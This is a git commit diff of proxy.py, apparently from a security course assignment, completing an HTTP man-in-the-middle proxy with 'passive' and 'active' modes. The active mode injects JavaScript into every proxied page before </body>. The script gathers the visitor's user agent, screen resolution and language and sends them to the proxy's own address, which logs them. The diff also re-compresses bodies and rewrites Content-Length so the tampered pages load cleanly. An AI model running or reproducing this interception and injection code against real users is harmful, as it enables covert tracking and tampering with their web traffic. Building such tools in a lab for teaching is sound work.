09cc6b153a7a32ec80a06b6b69ab42bdbc9ccc0a
Riccardo Strina <riccardo.strina@icloud.com>
2023-11-13 23:49:06 -0600

    The two modes are working

--- proxy.py
+++ proxy.py
@@ -7,15 +7,19 @@ import sys
 import zlib
 import brotli
 from urllib.parse import urlparse
+from urllib.parse import unquote
 
 args = None
+
 
 # Get the command line arguments
 def get_args():
     global args
 
     parser = argparse.ArgumentParser(description="DNS Injector")
-    parser.add_argument("-m", "--mode", help="passive | active, the mode the proxy should run in")
+    parser.add_argument(
+        "-m", "--mode", help="passive | active, the mode the proxy should run in"
+    )
     parser.add_argument("address", help="The IP address of the proxy")
     parser.add_argument("port", help="The port of the proxy")
     args = parser.parse_args()
@@ -31,6 +35,7 @@ def get_args():
 # HINT: use regex to capture nuances of different format types, look both at req and res packets
 # HINT: info can be passed in the URL and headers too
 
+
 def get_info(pattern: re.Pattern[str], lines: list[str]) -> list[str]:
     info = []
 
@@ -41,6 +46,7 @@ def get_info(pattern: re.Pattern[str], lines: list[str]) -> list[str]:
             info.append(match.group(1))
 
     return info
+
 
 def passive(data: str, url: str):
     search_lines = data.split("\r\n")
@@ -89,7 +95,7 @@ def active(body: str) -> str:
 
     func = """
     <script>
-    (function() {
+    (function() {{
         // Gather information
         var userAgent = navigator.userAgent; // User agent
         var screenRes = screen.width + 'x' + screen.height; // Screen resolution
@@ -101,14 +107,17 @@ def active(body: str) -> str:
                         '&lang=' + encodeURIComponent(language);
 
         // Send data to the proxy
-        var proxyUrl = 'http://{}:{}/?' + queryParams;
+        var proxyUrl = 'http://{0}:{1}/?' + queryParams;
 
         // Use fetch API to send the GET request
+        console.log(proxyUrl)
+
         fetch(proxyUrl);
-    })();
+    }})();
     </script>
-    """.format(args.address, args.port)
-    
+    """.format(
+        args.address, args.port
+    )
 
     # Inject the JS code
     body = body.replace("</body>", func + "</body>")
@@ -117,82 +126,51 @@ def active(body: str) -> str:
 
 
 def get_server_port(url: str) -> (str, int):
-    result = urlparse(url)
-    
-    return (result.netloc, result.port if result.port else 80)
+    pattern = re.compile(r"([a-zA-Z0-9.-]+)(?::(\d+))?")
+    match = pattern.match(url)
 
-def get_res_body(header: str, body: bytes) -> str:
+    if match:
+        domain = match.group(1)
+        port = int(match.group(2)) if match.group(2) else 80  # Default port is 80
+        return domain, port
+    else:
+        return None, None
+
+
+def decode_body(header: str, body: bytes) -> (str, str):
     encoding = get_encoding(header)
 
     if encoding == "gzip":
         print("[*] Decompressing gzip")
-        return gzip.decompress(body).decode("utf-8")
+        return (gzip.decompress(body).decode("utf-8"), encoding)
     elif encoding == "deflate":
         print("[*] Decompressing deflate")
-        return zlib.decompress(body).decode("utf-8")
+        return (zlib.decompress(body).decode("utf-8"), encoding)
     elif encoding == "br":
         print("[*] Decompressing brotli")
-        return brotli.decompress(body).decode("utf-8")
+        return (brotli.decompress(body).decode("utf-8"), encoding)
     else:
         print("[*] No encoding found")
-        
+
         try:
-            return body.decode("utf-8")
+            return (body.decode("utf-8"), None)
         except UnicodeDecodeError:
             print("[*] Could not decode response")
 
-    return ""
+    return ("", None)
 
 
+def encode_body(body: str, encoding: str) -> bytes:
+    injected = body.encode("utf-8")
 
-def handle_client(client_sock: socket, passive_mode: bool):
-    while True:
-        # Receive data from the client
-        client_data = get_data(client_sock)
+    if encoding == "gzip":
+        injected = gzip.compress(injected)
+    elif encoding == "deflate":
+        injected = zlib.compress(injected)
+    elif encoding == "br":
+        injected = brotli.compress(injected)
 
-        if client_data == b"":  # The client closed the connection
-            break
-
-        request = client_data.decode("utf-8")
-
-        print(f"[*] Received {len(client_data)} bytes from the client.")
-
-        # Get the URL from the request
-        url = get_url(request.split("\n")[0])
-
-        if not url:
-            continue
-
-        if passive_mode:
-            passive(request, url)
-        else:
-            active(request)
-
-        # Forward the request to the target server and fetch the response
-        target_server = get_server_port(url)
-
-        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        proxy_socket.connect(target_server)
-        proxy_socket.sendall(client_data)
-
-        # Receive the response from the target server
-        response_data = get_data(proxy_socket)
-
-        print(f"[*] Received {len(response_data)} bytes from the server.")
-
-        # Split the response into headers and body
-        response_bytes = response_data.split(b"\r\n\r\n")
-
-        headers = response_bytes[0].decode("utf-8")
-
-        body = get_res_body(headers, response_bytes[1])
-
-        if passive_mode:
-            passive(headers + "\r\n\r\n" + body, url)
-        else:
-            active(headers + "\r\n\r\n" + body)
-
-        client_sock.sendall(response_data)
+    return injected
 
 
 def get_data(socket: socket):
@@ -216,21 +194,95 @@ def get_encoding(http: str) -> str:
 
     if match:
         return match.group(1)
-    
+
     return None
 
 
 def get_url(req: str) -> str:
-    pattern = re.compile(r"(http[s]?://[^ \s]+)")
+    match = re.search(r"^Host:\s*(.+)$", req, re.MULTILINE)
 
-    # Find URL using the regular expression
-    url_match = pattern.search(req)
-
-    # Check if a URL was found
-    if url_match:
-        return url_match.group(1)
+    if match:
+        return match.group(1).strip()
 
     return None
+
+
+def get_query(req: str) -> dict[str, str]:
+    query = {}
+
+    url = unquote(req.split("\r\n")[0].split(" ")[1])
+    
+    for param in urlparse(url).query.split("&"):
+        key, value = param.split("=")
+        query[key] = value
+
+    return query
+
+
+def handle_client(client_sock: socket, passive_mode: bool):
+    while True:
+        # Receive data from the client
+        client_data = get_data(client_sock)
+
+        if client_data == b"":  # The client closed the connection
+            break
+
+        request = client_data.decode("utf-8")
+
+        print(f"[*] Received {len(client_data)} bytes from the client.")
+
+        # Get the URL from the request based on the host header
+        url = get_url(request)
+
+        if not url:
+            print("[!] No URL found, skipping...")
+            continue
+
+        if passive_mode:
+            passive(request, url)
+        else:
+            if url == f"{args.address}:{args.port}":
+                print("[*] Obtained data from the client")
+                
+                print(f"[*] Query {get_query(request)}")
+                # save those data in a file
+
+                client_sock.sendall(b"HTTP/1.1 200 OK\r\n\r\n")
+                continue
+
+        # Forward the request to the target server and fetch the response
+        target_server = get_server_port(url)
+
+        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        proxy_socket.connect(target_server)
+        proxy_socket.sendall(client_data)
+
+        # Receive the response from the target server
+        response_data = get_data(proxy_socket)
+
+        print(f"[*] Received {len(response_data)} bytes from the server.")
+
+        # Split the response into headers and body
+        response_components = response_data.split(b"\r\n\r\n")
+
+        headers = response_components[0].decode("utf-8")
+
+        body, encoding = decode_body(headers, response_components[1])
+
+        if passive_mode:
+            passive(headers + "\r\n" + body, url)
+        else:
+            injected = encode_body(active(body), encoding)
+
+            response_data = (
+                re.sub(
+                    r"Content-Length: \d+", f"Content-Length: {len(injected)}", headers
+                ).encode("utf-8")
+                + b"\r\n\r\n"
+                + injected
+            )
+
+        client_sock.sendall(response_data)
 
 
 def main():
@@ -253,7 +305,7 @@ def main():
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     listener.bind((args.address, int(args.port)))
-    listener.listen(1)
+    listener.listen(10)
 
     print(f"[*] Listening on {args.address}:{args.port}")
 
